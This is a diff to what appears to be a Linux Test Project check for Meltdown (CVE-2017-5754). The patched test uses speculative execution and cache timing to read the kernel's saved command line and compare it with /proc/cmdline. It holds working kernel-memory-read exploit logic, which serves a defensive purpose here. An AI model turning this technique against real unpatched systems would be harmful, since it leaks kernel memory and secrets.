@@ -1,20 +1,6 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
 /*
  * Copyright (c) 2018 Pavel Boldin <pboldin@cloudlinux.com>
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 2 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program. If not, see <http://www.gnu.org/licenses/>.
- *
- * Original exploit: https://github.com/paboldin/meltdown-exploit.
  */
 
 #include "config.h"
@@ -189,7 +175,7 @@ readbit(int fd, unsigned long addr, char bit)
 	for (i = 0; i < CYCLES; i++) {
 		ret = pread(fd, buf, sizeof(buf), 0);
 		if (ret < 0)
-			tst_res(TBROK | TERRNO, "can't read /proc/version");
+			tst_res(TBROK | TERRNO, "can't read fd");
 
 		clflush_target();
 
@@ -267,9 +253,15 @@ find_symbol_in_file(const char *filename, const char *symname)
 	int ret, read;
 	char fmt[strlen(symname) + 64];
 
+	tst_res(TINFO, "Looking for %s in %s", symname, filename);
+	if (access(filename, F_OK) == -1) {
+		tst_res(TINFO, "%s not available", filename);
+		return 0;
+	}
+
 	sprintf(fmt, "%%lx %%c %s%%c", symname);
 
-	ret = SAFE_FILE_LINES_SCANF(filename, fmt, &addr, &type, &read);
+	ret = FILE_LINES_SCANF(filename, fmt, &addr, &type, &read);
 	if (ret)
 		return 0;
 
@@ -287,28 +279,27 @@ find_kernel_symbol(const char *name)
 	if (addr)
 		return addr;
 
-	tst_res(TINFO, "not found '%s' in /proc/kallsyms", name);
 	if (uname(&utsname) < 0)
 		tst_brk(TBROK | TERRNO, "uname");
-
 	sprintf(systemmap, "/boot/System.map-%s", utsname.release);
-
-	tst_res(TINFO, "looking in '%s'\n", systemmap);
 	addr = find_symbol_in_file(systemmap, name);
 	return addr;
 }
 
-unsigned long linux_proc_banner_addr;
-int banner_fd;
+static unsigned long saved_cmdline_addr;
+static int spec_fd;
 
 static void setup(void)
 {
 	set_cache_hit_threshold();
 
-	linux_proc_banner_addr = find_kernel_symbol("linux_proc_banner");
-	tst_res(TINFO, "linux_proc_banner is at %lx", linux_proc_banner_addr);
+	saved_cmdline_addr = find_kernel_symbol("saved_command_line");
+	tst_res(TINFO, "&saved_command_line == 0x%lx", saved_cmdline_addr);
 
-	banner_fd = SAFE_OPEN("/proc/version", O_RDONLY);
+	if (!saved_cmdline_addr)
+		tst_brk(TCONF, "saved_command_line not found");
+
+	spec_fd = SAFE_OPEN("/proc/cmdline", O_RDONLY);
 
 	memset(target_array, 1, sizeof(target_array));
 
@@ -316,37 +307,69 @@ static void setup(void)
 		tst_res(TBROK | TERRNO, "set_signal");
 }
 
+#define READ_SIZE 32
+
 static void run(void)
 {
-	unsigned int i, score, ret;
-	static char expected[] = "%s version %s";
-	static char read[32];
-	unsigned long addr = linux_proc_banner_addr;
-	unsigned long size = sizeof(expected) - 1;
+	unsigned int i, score = 0, ret;
+	unsigned long addr;
+	unsigned long size;
+	char read[READ_SIZE] = { 0 };
+	char expected[READ_SIZE] = { 0 };
+	int expected_len;
 
+	expected_len = pread(spec_fd, expected, sizeof(expected), 0);
+	if (expected_len < 0)
+		tst_res(TBROK | TERRNO, "can't read test fd");
+
+	/* read address of saved_cmdline_addr */
+	addr = saved_cmdline_addr;
+	size = sizeof(addr);
 	for (i = 0; i < size; i++) {
-		ret = readbyte(banner_fd, addr);
+		ret = readbyte(spec_fd, addr);
 
 		read[i] = ret;
-		tst_res(TINFO, "read %lx = 0x%x %c", addr, ret,
+		tst_res(TINFO, "read %lx = 0x%02x %c", addr, ret,
 			isprint(ret) ? ret : ' ');
 
 		addr++;
 	}
 
-	for (score = 0, i = 0; i < size; i++)
+	/* read value pointed to by saved_cmdline_addr */
+	memcpy(&addr, read, sizeof(addr));
+	memset(read, 0, sizeof(read));
+	tst_res(TINFO, "save_command_line: 0x%lx", addr);
+	size = expected_len;
+
+	if (!addr)
+		goto done;
+
+	for (i = 0; i < size; i++) {
+		ret = readbyte(spec_fd, addr);
+
+		read[i] = ret;
+		tst_res(TINFO, "read %lx = 0x%02x %c | expected 0x%02x |"
+			" match: %d", addr, ret, isprint(ret) ? ret : ' ',
+			expected[i], read[i] == expected[i]);
+
+		addr++;
+	}
+
+	for (i = 0; i < size; i++)
 		if (expected[i] == read[i])
 			score++;
 
+done:
 	if (score > size / 2)
 		tst_res(TFAIL, "I was able to read your kernel memory!!!");
 	else
 		tst_res(TPASS, "I was not able to read your kernel memory");
+	tst_res(TINFO, "score(matched/all): %u / %lu", score, size);
 }
 
 static void cleanup(void)
 {
-	SAFE_CLOSE(banner_fd);
+	SAFE_CLOSE(spec_fd);
 }
 
 static struct tst_test test = {
@@ -354,7 +377,11 @@ static struct tst_test test = {
 	.setup = setup,
 	.test_all = run,
 	.cleanup = cleanup,
-	.min_kver = "2.6.32"
+	.min_kver = "2.6.32",
+	.tags = (const struct tst_tag[]) {
+		{"CVE", "2017-5754"},
+		{}
+	}
 };
 
 #else /* #if defined(__x86_64__) || defined(__i386__) */
